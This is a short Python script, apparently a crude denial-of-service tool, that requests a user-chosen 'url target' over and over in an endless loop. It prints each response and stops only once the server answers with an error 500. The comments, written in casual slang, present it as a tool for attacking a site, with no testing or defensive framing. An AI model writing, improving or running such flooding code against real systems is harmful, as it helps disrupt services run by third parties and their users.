import requests 
from colorama import Fore 
url = "https://example.com/" # here u can ur url target make sure ur not getting deep frr

try :
    while True:
        r= requests.get(url= url )
        print(Fore.GREEN + f"{r.text}") # Thats show u the responses of the server to make sure the code is runing up 
        if r.status_code == 200 :
            continue
        elif r.status_code == 500 :
            break
except Exception as e :
    print(Fore.RED + f"u got an error : {e}")
